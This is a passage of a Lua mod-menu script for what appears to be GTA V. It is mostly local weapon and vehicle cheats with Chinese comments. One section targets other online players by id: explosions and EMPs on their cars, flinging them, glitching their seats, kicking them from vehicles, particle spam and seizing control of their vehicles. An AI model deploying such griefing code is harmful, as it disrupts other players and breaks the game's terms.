                    ENTITY.SET_ENTITY_ROTATION(animal, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(animal) do
                        wait()
                    end
                    local animalPos = ENTITY.GET_ENTITY_COORDS(animal, true)
                    entities.delete_by_handle(animal)
                    FIRE.ADD_EXPLOSION(animalPos.x, animalPos.y,animalPos.z, 1, 10, true, false, 1, false)
                end)
            end
        else
            disable_firing = false
        end
        wait(200)
    end
    disable_firing = false
end
local impactCords = v3.new()
local blocks = {}
function xxxminecraftgun()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), impactCords) then
        local hash = util.joaat('prop_mb_sandblock_01')
        loadModel(hash)
        blocks[#blocks + 1] = entities.create_object(hash, impactCords)
    end
end
function deleminecraftlastblock()
    if blocks[#blocks] != nil then
        entities.delete_by_handle(blocks[#blocks])
        blocks[#blocks] = nil
    end
end
function deleallblock()
    for i = 1, #blocks do
        entities.delete_by_handle(blocks[i])
        blocks[i] = nil
    end
end
local flameThrower = {
    colour = mildOrangeFire
}
function flamegun()
    if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) != 1119849093 or not K.is_control_pressed(2, 'INPUT_AIM') then
        if not flameThrower.ptfx then return end
        GRAPHICS.REMOVE_PARTICLE_FX(flameThrower.ptfx, true)
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        flameThrower.ptfx = nil
        return
    end
    PLAYER.DISABLE_PLAYER_FIRING(players.user_ped(), true)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
    if flameThrower.ptfx == nil then
        flameThrower.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 0.8, 0, 0, 0, 0, 270, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped()), 'Gun_Nuzzle'), 0.5, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(flameThrower.ptfx, flameThrower.colour.r, flameThrower.colour.g, flameThrower.colour.b)
    end
end
function get_offset_from_cam(dist)
	local rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
	local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local dir = rot:toDir()
	dir:mul(dist)
	local offset = v3.new(pos)
	offset:add(dir)
	return offset
end
function get_vehicles_in_player_range(player, radius)
	local vehicles = {}
	local pos = players.get_position(player)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
		local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
		if pos:distance(vehPos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end
local ShootEffect =
{
    scale = 0,
	rotation = nil
}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)
function ShootEffect.new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end
---@type ShootEffect[]
local shootingEffects <const> = {
	ShootEffect.new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0))
}
function shootingeffect()
    local effect = shootingEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
	elseif PED.IS_PED_SHOOTING(players.user_ped()) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
		local boneId = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end
function setshootingeffect(index)
    selectedOpt = index
end
local colour <const> = {r = 0, g = 255, b = 255, a = 255}
local function draw_marker(type, pos, scale, colour, textureDict, textureName)
	textureDict = textureDict or 0
	textureName = textureName or 0
	GRAPHICS.DRAW_MARKER(
		type,
		pos.x, pos.y, pos.z,
		0.0, 0.0, 0.0,
		0.0, 0.0, 0.0,
		scale, scale, scale,
		colour.r, colour.g, colour.b, colour.a,
		false, false, 0, true, textureDict, textureName, false
	)
end
local function rainbow_colour(colour)
	if colour.r > 0 and colour.b == 0 then
		colour.r = colour.r - 1
		colour.g = colour.g + 1
	end
	if colour.g > 0 and colour.r == 0 then
		colour.g = colour.g - 1
		colour.b = colour.b + 1
	end
	if colour.b > 0 and colour.g == 0 then
		colour.r = colour.r + 1
		colour.b = colour.b - 1
	end
end
entityPairs = {}
shotEntities = {}
counter = 0
function ctst()
    local entity = get_entity_player_is_aiming_at(players.user())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})
		if PED.IS_PED_SHOOTING(players.user_ped()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end
		if counter == 2 then
			local entPair = EntityPair.new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end
	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then entPair:attract() else table.remove(entityPairs, i) end
	end
end
EntityPair = {ent1 = 0, ent2 = 0}
EntityPair.__index = EntityPair
---@param ent1 Entity
---@param ent2 Entity
---@return EntityPair
function EntityPair.new(ent1, ent2)
	local instance = setmetatable({}, EntityPair)
	instance.ent1 = ent1
	instance.ent2 = ent2
	return instance
end
EntityPair.__eq = function (a, b)
	return a.ent1 == b.ent1 and a.ent2 == b.ent2
end
---@return boolean
function EntityPair:exists()
	return ENTITY.DOES_ENTITY_EXIST(self.ent1) and ENTITY.DOES_ENTITY_EXIST(self.ent2)
end
local apply_force_to_ent = function (ent, force, flag)
	if ENTITY.IS_ENTITY_A_PED(ent) then
		if PED.IS_PED_A_PLAYER(ent) then return end
		PED.SET_PED_TO_RAGDOLL(ent, 1000, 1000, 0, false, false, false)
	end
	if request_control_once(ent) then
		ENTITY.APPLY_FORCE_TO_ENTITY(ent, flag or 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
	end
end
function EntityPair:attract()
	local pos1 = ENTITY.GET_ENTITY_COORDS(self.ent1, false)
	local pos2 = ENTITY.GET_ENTITY_COORDS(self.ent2, false)
	local force = v3.new(pos2)
	force:sub(pos1)
	force:mul(0.05)
	apply_force_to_ent(self.ent1, force)
	force:mul(-1)
	apply_force_to_ent(self.ent2, force)
end
function magnetgun()
    if not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then return end
	local numVehicles = 0
	local offset = get_offset_from_cam(30.0)
	local vehicles <const> = get_vehicles_in_player_range(players.user(), 70.0)
    rainbow_colour(colour)
    draw_marker(28, offset, 0.4, colour)
	for _, vehicle in ipairs(vehicles) do
		if PED.GET_VEHICLE_PED_IS_USING(players.user_ped()) ~= vehicle and
		numVehicles < 20 and request_control_once(vehicle) then
			numVehicles = numVehicles + 1
			local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
			local vect = v3.new(offset)
			vect:sub(vehiclePos)
			if selectedOpt == 1 then
				ENTITY.SET_ENTITY_VELOCITY(vehicle, vect.x,vect.y,vect.z)
			elseif selectedOpt == 2 then
				vect:mul(0.5)
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, vect.x,vect.y,vect.z, 0.0, 0.0, 0.5, 0, false, false, true, false, false)
			end
		end
	end
end
function setmagnetgun(index)
    selectedOpt = index
end
local thermal_command = menu.ref_by_path('Game>Rendering>Thermal Vision')
function thermalgun()
    local aiming = PLAYER.IS_PLAYER_FREE_AIMING(players.user())
    if GRAPHICS.GET_USINGSEETHROUGH() and not aiming then
        menu.trigger_command(thermal_command,'off')
        GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(1)
    elseif PAD.IS_CONTROL_JUST_PRESSED(38,38) then
        if menu.get_value(thermal_command) or not aiming then
            menu.trigger_command(thermal_command,"off")
            GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(1)
        else
            menu.trigger_command(thermal_command,"on")
            GRAPHICS._SEETHROUGH_SET_MAX_THICKNESS(50)
        end
    end
end
function supeerrunning()
    local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
	if is_performing_action then
        menu.trigger_commands("godmode on")
        menu.trigger_commands("grace on")
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
		FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 25.0, false, true, 0.0, true)
		AUDIO.PLAY_SOUND_FRONTEND(-1, "EMP_Blast", "DLC_HEISTS_BIOLAB_FINALE_SOUNDS", false)
    else
        menu.trigger_commands("godmode off")
	end
end
function runreload()
    if TASK.GET_IS_TASK_ACTIVE(PLAYER.PLAYER_PED_ID(), 4) and PAD.IS_CONTROL_PRESSED(2, 22) and not PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        --checking if player is rolling
        wait(900)
        WEAPON.REFILL_AMMO_INSTANTLY(PLAYER.PLAYER_PED_ID())
    end
end
function unlimitedbullet(toggle)
    isInfiniteAmmo = toggle
    while isInfiniteAmmo do
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(PLAYER.PLAYER_PED_ID(), true)
        wait()
    end
    if not isInfiniteAmmo then
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(PLAYER.PLAYER_PED_ID(), false)
    end
end
function lockthebullet()
    local curWeaponMem = memory.alloc()
    local junk = WEAPON.GET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), curWeaponMem, 1)
    local curWeapon = memory.read_int(curWeaponMem)
    memory.free(curWeaponMem)
    local curAmmoMem = memory.alloc()
    junk = WEAPON.GET_MAX_AMMO(PLAYER.PLAYER_PED_ID(), curWeapon, curAmmoMem)
    local curAmmoMax = memory.read_int(curAmmoMem)
    memory.free(curAmmoMem)
    if curAmmoMax then
        WEAPON.SET_PED_AMMO(PLAYER.PLAYER_PED_ID(), curWeapon, curAmmoMax)
    end
end
function airstgun()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0)
	end
end
local function get_time_between_shots()
	local CPed = entities.handle_to_pointer(players.user_ped())
	local addr = addr_from_pointer_chain(CPed, {0x10B8, 0x20, 0x013C})
	return addr ~= 0 and memory.read_float(addr) * 1000 or -1.0
end
function bulletchanger()
    local localPed = players.user_ped()
	if not WEAPON.IS_PED_ARMED(localPed, 4) then
		return
	end
	local selectedBullet = util.joaat(weaponbulletModels[selectedOpt])
	if not WEAPON.HAS_WEAPON_ASSET_LOADED(selectedBullet) then
		WEAPON.REQUEST_WEAPON_ASSET(selectedBullet, 31, 26)
		WEAPON.GIVE_WEAPON_TO_PED(localPed, selectedBullet, 200, false, false)
	end
	PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
	if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
	PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and timer.elapsed() > math.max(get_time_between_shots(), 80.0) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(localPed, false)
		local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		local bonePos = ENTITY.GET_ENTITY_BONE_POSTION(weapon, bone)
		local offset = get_offset_from_cam(30.0)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			bonePos.x, bonePos.y, bonePos.z,
			offset.x, offset.y, offset.z,
			200,
			true,
			selectedBullet,
			localPed, true, false, 2000.0
		)
		PAD.SET_CONTROL_SHAKE(0, 50, 100)
		timer.reset()
	elseif PAD.IS_DISABLED_CONTROL_JUST_RELEASED(0, 24) then
		PAD.STOP_CONTROL_SHAKE(0)
	end
end
function bulletchanger_set(opt)
    selectedOpt = opt
end
function friendshipgun(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end
function get_entity_player_is_aiming_at(player)
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return NULL
	end
	local entity, pEntity = NULL, memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, pEntity) then
		entity = memory.read_int(pEntity)
	end
	if entity ~= NULL and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end
-- 
function calculateDistanceMovedBetweenCoords(oldCord, newCord)
    local difX = (newCord['x'] - oldCord['x']) ^ 2
    local difY = (newCord['y'] - oldCord['y']) ^ 2
    local difZ = (newCord['z'] - oldCord['z']) ^ 2
    local distance = math.sqrt(difX + difY + difZ)
    return distance
end
hit_ent1 = nil
hit_ent2 = nil
hit_pos_1 = nil
hit_pos_2 = nil
ropeTogetherannounced = false
ropeList = {}
function ropeTogether() -- 绳索载具枪
    if not ropeTogetherannounced then
        notification("请射击第一个实体！")
        ropeTogetherannounced = true
    end
    local coords = v3.new()
    local has_hit, last_impact = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), coords)
    if has_hit then
        if not hit_ent1 then
            hit_ent1 = get_entity_player_is_aiming_at(players.user())
            hit_pos_1 = coords
            if hit_ent1 and hit_ent1 ~= 0 then
                notification("第一个实体已选定: " .. hit_ent1)
                if ENTITY.IS_ENTITY_A_PED(hit_ent1) and PED.IS_PED_IN_ANY_VEHICLE(hit_ent1) then
                    hit_ent1 = PED.GET_VEHICLE_PED_IS_USING(hit_ent1)
                end
                notification("请射击第二个实体！")
            else
                notification("未找到实体，请重新尝试！")
                return HANDLER_CONTINUE
            end
        else
            hit_ent2 = get_entity_player_is_aiming_at(players.user())
            hit_pos_2 = coords
            if hit_ent2 and hit_ent2 ~= 0 then
                notification("第二个实体已选定: " .. hit_ent2)
                if ENTITY.IS_ENTITY_A_PED(hit_ent2) and PED.IS_PED_IN_ANY_VEHICLE(hit_ent2) then
                    hit_ent2 = PED.GET_VEHICLE_PED_IS_USING(hit_ent2)
                end
                local distance = calculateDistanceMovedBetweenCoords(ENTITY.GET_ENTITY_COORDS(hit_ent1),
                    ENTITY.GET_ENTITY_COORDS(hit_ent2))
                local ropePos = ENTITY.GET_ENTITY_COORDS(hit_ent1)
                local newRope = PHYSICS.ADD_ROPE(ropePos.x, ropePos.y, ropePos.z, 0, 0, 0, 1, 1, 10, 10, 10, true, true,
                    true, 1.0, false, 0)
                PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, hit_ent1, hit_ent2, hit_pos_1.x, hit_pos_1.y, hit_pos_1.z,
                    hit_pos_2.x, hit_pos_2.y, hit_pos_2.z, distance, 0, 0, "Center", "Center")
                notification("两个实体已通过绳索连接！")
                ropeTogetherannounced = false
                hit_ent1 = nil
                hit_ent2 = nil
                hit_pos_1 = nil
                hit_pos_2 = nil
                return HANDLER_POP
            else
                notification("未找到第二个实体，请重新尝试！")
                return HANDLER_CONTINUE
            end
        end
    end
    return HANDLER_CONTINUE
end
function magnetents()
    local entity = get_entity_player_is_aiming_at(players.user())
	if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
		draw_bounding_box(entity, true, {r = 255, g = 255, b = 255, a = 81})
		if PED.IS_PED_SHOOTING(players.user_ped()) and
		not (shotEntities[1] and shotEntities[1] == entity) then
			counter = counter + 1
			shotEntities[counter] = entity
		end
		if counter == 2 then
			local entPair = EntityPair.new(table.unpack(shotEntities))
			table.insert_once(entityPairs, entPair)
			counter = 0
			shotEntities = {}
		end
	end
	for i = #entityPairs, 1, -1 do
		local entPair = entityPairs[i]
		if entPair:exists() then entPair:attract() else table.remove(entityPairs, i) end
	end
end
function ROTATION_TO_DIRECTION(rotation) --https://forum.cfx.re/t/get-position-where-player-is-aiming/1903886/2
	local adjusted_rotation = 
	{ 
		x = (math.pi / 180) * rotation.x, 
		y = (math.pi / 180) * rotation.y, 
		z = (math.pi / 180) * rotation.z 
	}
	local direction = 
	{
		x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
		z =  math.sin(adjusted_rotation.x)
	}
	return direction
end
function incr(ptr, fvalue, delta)
    local cvalue = memory.read_float(ptr) 
    local delta = math.abs(delta)
	if cvalue ~= fvalue then
    	if cvalue > fvalue then 
			delta = -delta 
		end
    	if math.abs(fvalue - cvalue) > delta then
    	    cvalue = cvalue + delta
    	else  
    	    cvalue = fvalue
    	end
	end
    memory.write_float(ptr, cvalue)
end
function aa_thread()
    aa_threadv = util.create_thread(function()
        while true do
            if not noaccident then
                util.stop_thread()
            end
            if player_cur_car ~= 0 then
                local c = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
                local size = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car))
                for i=1,3 do
                    if i == 1 then
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, -size['x'], size['y']+0.1, size['z']/2)
                    elseif i == 2 then
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, 0.0, size['y']+0.1, size['z']/2)
                    else
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, size['x'], size['y']+0.1, size['z']/2)
                    end
                    if ENTITY.GET_ENTITY_SPEED(player_cur_car) > 10 then
                        log("aa thread allocation")
                        local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
                        SHAPETEST.GET_SHAPE_TEST_RESULT(
                            SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
                                c.x,
                                c.y,
                                c.z,
                                aad.x,
                                aad.y,
                                aad.z,
                                -1,
                                player_cur_car,
                                4
                            ), ptr1, ptr2, ptr3, ptr4)
                        local p1 = memory.read_int(ptr1)
                        local p2 = memory.read_vector3(ptr2)
                        local p3 = memory.read_vector3(ptr3)
                        local p4 = memory.read_int(ptr4)
                        log("aa thread free mem")
                        memory.free(ptr1)
                        memory.free(ptr2)
                        memory.free(ptr3)
                        memory.free(ptr4)
                        local results = {p1, p2, p3, p4}
                        if results[1] ~= 0 then
                            ENTITY.SET_ENTITY_VELOCITY(player_cur_car, 0.0, 0.0, 0.0)
                            gtoast("车辆事故即将发生！ 停止车辆。")
                        end
                    end
                end
            end
        wait()
        end
    end)
end
------------------------------------
-----------粒子效果轰炸-------------
------------------------------------
function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end
local ptfx = {lib = 'scr_rcbarry2', sel = 'scr_clown_appears'}
function ftpxspam(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    Streamptfx(ptfx.lib)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( ptfx.sel, tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 10.0, true, true, true)
end
function ftpxspam_set(fxsel)
    ptfx.sel = Fxha[fxsel]
    ptfx.lib = 'core'
end
------------------------------------
-------------载具恶搞---------------
------------------------------------
local function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end
function caremp(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        local c = ENTITY.GET_ENTITY_COORDS(car)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 83, 100.0, false, true, 0.0)
    end
end
function carspin(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity_once(car)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(car, 4, 0.0, 0.0, 300.0, 0, true, true, false, true, true, true)
    end
end
local glitchVeh = false
function glitchcar(toggle, pid)
    glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(pid)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        while glitchVeh do
            if not players.exists(pid) then 
                gtoast("玩家不存在. :/")
                menu.set_value(glitchVehCmd, false);
            util.stop_thread() end
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                gtoast("玩家太远了. :/")
                menu.set_value(glitchVehCmd, false);
            break end
            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                gtoast("他不在车里! ")
                menu.set_value(glitchVehCmd, false);
            break end
            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                gtoast("车上没空座位了\n建议你给他车砸了.")
                menu.set_value(glitchVehCmd, false);
            break end
            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end
            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        wait()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end
function kickcar(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        DECORATOR.DECOR_REGISTER("Player_Vehicle", 3)
        DECORATOR.DECOR_SET_INT(player_veh,"Player_Vehicle", 0)
    else
        gtoast("玩家不在车内. :/")
    end
end
function get_player_vehicle_in_control(pid, opts)
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()) -- Needed to turn off spectating while getting control
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    -- Calculate how far away from target
    local pos1 = ENTITY.GET_ENTITY_COORDS(target_ped)
    local pos2 = ENTITY.GET_ENTITY_COORDS(my_ped)
    local dist = SYSTEM.VDIST2(pos1.x, pos1.y, 0, pos2.x, pos2.y, 0)
    local was_spectating = NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() -- Needed to toggle it back on if currently spectating
    -- If they out of range (value may need tweaking), auto spectate.
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
    if opts and opts.near_only and vehicle == 0 then
        return 0
    end
    if vehicle == 0 and target_ped ~= my_ped and dist > 340000 and not was_spectating then
        menu.toast("AUTO_SPECTATE")
        show_busyspinner(menu.format("AUTO_SPECTATE"))
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target_ped)
        -- To prevent a hard 3s loop, we keep waiting upto 3s or until vehicle is acquired
        local loop = (opts and opts.loops ~= nil) and opts.loops or 30 -- 3000 / 100
        while vehicle == 0 and loop > 0 do
            wait(100)
            vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
            loop = loop - 1
        end
        HUD.BUSYSPINNER_OFF()
    end
    if vehicle > 0 then
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            return vehicle
        end
        -- Loop until we get control
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vehicle)
        local has_control_ent = false
        local loops = 15
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        -- Attempts 15 times, with 8ms per attempt
        while not has_control_ent do
            has_control_ent = NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            loops = loops - 1
            -- wait for control
            wait(15)
            if loops <= 0 then
                break
            end
        end
    end
    if not was_spectating then
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, target_ped)
    end
    return vehicle
end
local function control_vehicle(pid, callback, opts)
    local vehicle = get_player_vehicle_in_control(pid, opts)
    if vehicle > 0 then
        callback(vehicle)
    elseif opts == nil or opts.silent ~= true then
        gtoast("玩家不在车内或不在范围内。")
    end
end
function fastoncar()
    local localped = PLAYER.PLAYER_PED_ID()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_ENTERING(localped)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(veh) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000)
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
        end
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 then
            --15 is heli
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
        end
    end
end
function unlockcar()
    -- 解锁正在进入的载具
function UnlockVehicleGetIn()
    :: start ::
    local localPed = PLAYER.PLAYER_PED_ID()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        ENTITY.FREEZE_ENTITY_POSITION(veh, false)
        wait()
    else
        if veh ~= 0 then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    wait(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                gtoast("请等待两秒，无法控制载具!")
                goto start
            else
                gtoast("已控制载具.")
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end
UnlockVehicleGetIn()
end
function FastTurnVehicleWithKeys(scale)
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velocity = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
